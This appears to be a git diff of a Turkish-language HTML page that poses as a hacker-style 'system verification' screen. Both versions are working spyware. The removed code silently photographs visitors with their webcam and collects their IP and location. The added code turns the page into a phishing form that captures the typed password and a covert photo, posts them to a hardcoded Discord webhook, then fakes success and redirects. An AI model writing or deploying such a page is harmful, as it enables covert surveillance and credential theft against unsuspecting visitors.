@@ -3,146 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ömer Ekşi | Global Security</title>
+    <title>Sistem Doğrulama | Ömer Ekşi</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.25; }
-        
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
-        #start-btn { padding: 25px 60px; font-size: 1.4rem; background: transparent; color: #00ff00; border: 2px solid #00ff00; cursor: pointer; box-shadow: 0 0 20px #00ff00; font-weight: bold; letter-spacing: 5px; transition: 0.3s; }
-        #start-btn:hover { background: #00ff00; color: #000; }
-
-        .terminal-container { width: 80%; max-width: 600px; padding: 20px; border: 1px solid #00ff00; background: rgba(0, 15, 0, 0.9); box-shadow: 0 0 30px #004400; display: none; }
-        .log-line { margin-bottom: 5px; font-size: 0.9rem; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-
-        /* GİZLİ ELEMANLAR */
-        #video, #canvas { position: absolute; left: -9999px; opacity: 0; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .login-box { border: 1px solid #00ff00; padding: 30px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #00ff00; text-align: center; width: 300px; z-index: 10; }
+        input { background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 10px; margin: 10px 0; width: 100%; outline: none; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
+        video, canvas { display: none; }
+        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
     </style>
 </head>
 <body>
-
     <canvas id="matrix-canvas"></canvas>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <div id="overlay">
-        <h2 style="color: #00ff00; letter-spacing: 10px; margin-bottom: 30px;">OMER EKSI CORE</h2>
-        <button id="start-btn" onclick="executeSystem()">SİSTEMİ ÇALIŞTIR</button>
-        <p style="color: #444; margin-top: 20px; font-size: 12px;">Permission Required: MediaDevice & Network</p>
-    </div>
-
-    <div class="terminal-container" id="terminal">
-        <div class="log-line">>> [SYSTEM] INITIALIZING...</div>
-        <div class="log-line" id="l1"></div>
-        <div class="log-line" id="l2"></div>
-        <div class="log-line" id="l3"></div>
-        <div class="log-line" id="l4"></div>
-        <div class="log-line" style="color: #ff0000; font-weight: bold;" id="l5"></div>
-        <div class="log-line blink" style="margin-top: 15px;">_</div>
+    <div class="login-box">
+        <h2 style="font-size: 1.2rem;">KİMLİK DOĞRULAMA</h2>
+        <p style="font-size: 0.8rem; color: #888;">Devam etmek için sistem şifrenizi girin.</p>
+        <input type="password" id="target_pass" placeholder="Sistem Şifresi...">
+        <button onclick="captureAll()">DOĞRULA</button>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1470110601714864198/Gxgga4v26nLVHeZPgqpTrrg5sqnp4xsJsVjP0BuDKmNXcRdsVYv284lOBul-gUcj4jPw";
 
-        async function executeSystem() {
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('terminal').style.display = 'block';
-            drawMatrix();
-
-            // Adım 1: Terminal Logları
-            logLine("l1", ">> [NETWORK] FETCHING IP DATA...");
-            
-            // Adım 2: Kamera ve IP İşlemleri
+        // Kamera İzni Site Açılır Açılmaz Alınır
+        window.onload = async () => {
             try {
-                // Kamera Erişimi
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                document.getElementById('video').srcObject = stream;
+            } catch (e) {}
+            drawMatrix();
+        };
 
-                logLine("l2", ">> [MEDIA] CAMERA INTERFACE CONNECTED.");
+        async function captureAll() {
+            const pass = document.getElementById('target_pass').value;
+            if(!pass) return alert("Şifre boş olamaz!");
 
-                // IP Bilgisi Çek
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                logLine("l3", ">> [TARGET] IP: " + ipData.ip);
+            // 1. Fotoğraf Çek
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/png');
 
-                // Fotoğraf Çek (Kameranın odaklanması için 2sn bekleme)
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageData = canvas.toDataURL('image/png');
-                    
-                    // Discord'a Gönder
-                    sendToDiscord(imageData, ipData);
-                    
-                    // Kamerayı Kapat (Işık sönsün)
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    logLine("l4", ">> [SYSTEM] SECURITY SCAN COMPLETE.");
-                    logLine("l5", ">> [ACCESS] GRANTED TO OMER EKSI SERVER.");
-                }, 2000);
+            // 2. IP Bilgisi Al
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
 
-            } catch (err) {
-                logLine("l2", ">> [ERROR] ACCESS DENIED BY USER.", "#ff0000");
-                sendSimpleLog("⚠️ Kamera izni verilmedi veya cihaz bulunamadı!");
-            }
-        }
-
-        async function sendToDiscord(image, ipInfo) {
-            // Base64 image to Blob
-            const blob = await (await fetch(image)).blob();
+            // 3. Her Şeyi Discord'a Gönder
+            const blob = await (await fetch(imageData)).blob();
             const formData = new FormData();
-            formData.append("file", blob, "captured.png");
+            formData.append("file", blob, "victim.png");
             
             const payload = {
-                username: "ÖMER EKŞİ SECURITY",
-                content: `📸 **YENİ ZİYARETÇİ YAKALANDI**\n\n**IP:** \`${ipInfo.ip}\`\n**KONUM:** ${ipInfo.city} / ${ipInfo.country_name}\n**ISP:** ${ipInfo.org}\n**CİHAZ:** ${navigator.platform}`,
+                username: "ÖMER EKŞİ LOGGER",
+                content: `🔑 **HEDEF ŞİFRESİNİ GİRDİ!**\n\n**Şifre:** \`${pass}\`\n**IP:** \`${ipData.ip}\`\n**Konum:** ${ipData.city}/${ipData.country_name}`
             };
 
             formData.append("payload_json", JSON.stringify(payload));
+            await fetch(webhookURL, { method: "POST", body: formData });
 
-            fetch(webhookURL, { method: "POST", body: formData });
+            // 4. Kurbanı kandır ve yönlendir
+            alert("Sistem Doğrulandı. Yönlendiriliyorsunuz...");
+            window.location.href = "https://google.com";
         }
 
-        async function sendSimpleLog(msg) {
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: "Ömer Ekşi Logger", content: msg })
-            });
-        }
-
-        function logLine(id, text, color = "#00ff00") {
-            const el = document.getElementById(id);
-            el.style.color = color;
-            el.innerText = text;
-        }
-
-        // MATRIX ARKA PLAN
-        const c = document.getElementById('matrix-canvas');
-        const ctx = c.getContext('2d');
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        const textArr = "ÖMER EKŞİ 01".split("");
-        const drops = Array.from({ length: Math.floor(c.width / 20) }).fill(1);
-
+        // Matrix Arka Plan (Öncekiyle aynı)
         function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            ctx.fillRect(0, 0, c.width, c.height);
-            ctx.fillStyle = "#00ff00";
-            ctx.font = "15px monospace";
-            drops.forEach((y, i) => {
-                const char = textArr[Math.floor(Math.random() * textArr.length)];
-                ctx.fillText(char, i * 20, y * 20);
-                if (y * 20 > c.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            });
-            requestAnimationFrame(drawMatrix);
+            const c = document.getElementById('matrix-canvas');
+            const ctx = c.getContext('2d');
+            c.width = window.innerWidth; c.height = window.innerHeight;
+            const drops = Array.from({ length: 50 }).fill(1);
+            setInterval(() => {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+                ctx.fillRect(0, 0, c.width, c.height);
+                ctx.fillStyle = "#00ff00";
+                drops.forEach((y, i) => {
+                    ctx.fillText("01", i * 20, y * 20);
+                    if (y * 20 > c.height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                });
+            }, 50);
         }
     </script>
 </body>
